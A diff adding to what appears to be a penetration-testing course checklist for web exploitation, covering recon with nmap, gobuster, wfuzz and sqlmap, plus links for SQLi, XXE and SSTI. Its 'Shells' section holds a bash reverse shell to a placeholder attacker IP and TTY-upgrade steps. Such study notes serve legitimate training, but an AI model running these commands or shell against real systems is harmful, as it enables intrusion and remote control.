@@ -1,5 +1,42 @@
 # Web 200 Checklist
 
+### Tools
+* payloadsallthethings
+	- Path: /usr/share/seclists/
+
+* seclists
+	- Install: sudo apt-get install seclists
+	- Path: /usr/share/seclists/
+
+* dirb
+* Hakrawler
+	- echo "$URL" > urls.txt
+      cat urls.txt | hakrawler
+
+* gobuster
+	- Install: sudo apt-get install gobuster
+	- Endpoint Discovery: gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+	- Subdomain Discovery: gobuster dns -d $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+
+* nmap
+	- nmap -p- -sV -sS -Pn -A $IP
+
+* sqlmap
+	- POST: Copy POST request from Burp Suite into post.txt file
+		sqlmap -r post.txt -p parameter
+* Burpsuite
+* wfuzz
+	- Directory Discovery: wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404,301 "$URL/FUZZ/"
+	- Authenticated Directory Discovery: wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 -b "PARAM=value" "$URL/FUZZ/"
+	- File Discovery: wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 301,404 "$URL/FUZZ"
+	- Authenticated File Fuzzing: wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 301,404,403 -b "PARAM=value" "$URL/FUZZ"
+	- Parameter Discovery: wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 "$URL/FUZZ=data"
+	- GET Parameter Values: wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404,301 "$URL/index.php?parameter=FUZZ"
+	- HTML_escape Fuzzing: wfuzz -c -z file,/usr/share/wordlists/Fuzzing/yeah.txt "$URL/FUZZ"
+  
+
+
+
 ### Discovery
 * sudo nmap -v -sS -sV -Pn -A ip_addr
 * File / directory discovery (note sometimes you also want to dirbust more than just the web root ie dirbusting against http://site/login.php/FUZZ)
@@ -13,6 +50,17 @@
 * Pw / Username discovery - cewl - `cewl -d 2 -m 5 -w docswords.txt https://example.com`
 * Binary discovery on box: ` which nc socat curl wget bash sh`
 
+### Shells
+- Vulnerabilities that may lead to some kind of remote code execution
+- Privesc
+- Start out:
+	bash -c 'bash -i >& /dev/tcp/<KALI-IP>/9090 0>&1'
+- To make it fully interactive:
+	python -c 'import pty;pty.spawn("/bin/bash")' export TERM=xterm
+- CTRL + Z:
+	stty raw -echo; fg
+
+
 ## Test All Of These Scenarios!
 - [ ] cewl/dirsearch
 - [ ] xss
@@ -23,6 +71,14 @@
 - [ ] SSTI
 - [ ] OS injection
 - [ ] Server Side Request Forgery
+
+### Seclists
+- SQLi
+- Local File Inclusion
+- Server-side Template Injection
+
+sudo apt-get install -y seclists
+cd /usr/share/seclists/
 
 ### XSS (Course material / notes)
 <b>Remember ALL CODE CAN BE TESTED IN CONSOLE IN CASE OF DEBUGGING</b>
@@ -137,6 +193,8 @@ To host your xss.js file using Caddy, from within the directory that contains th
 Then to view any incoming requests / logs you can `cat caddylog` or to view just the pertinent information run `tail -f caddylog | jq '.request | del(.headers)'`
 
 ### SQLi
+https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 <b>wfuzz to test for sqli</b>
 GET: `wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$URL/index.php?id=FUZZ"`
@@ -163,6 +221,9 @@ Note: The labs indicate that if the host is Windows it is highly likely this wil
 ```wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 http://site:8080/test/FUZZ```
 
 ### XXE
+https://portswigger.net/web-security/xxe
+https://portswigger.net/web-security/xxe/blind 
+
 If you see XML in ANY request, you should be testing for this
 
 Wordlist to use in Burp Suite Intruder for fuzzing XXE: `/usr/share/seclists/Fuzzing/XXE-Fuzzing.txt`
@@ -246,6 +307,9 @@ Note that extracting file with multiple lines may not work due to encoding issue
 ```
 
 ### SSTI
+https://portswigger.net/web-security/images/template-decision-tree.png
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection 
+
 [Master List of SSTI Injection Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
 <b>Fuzzing
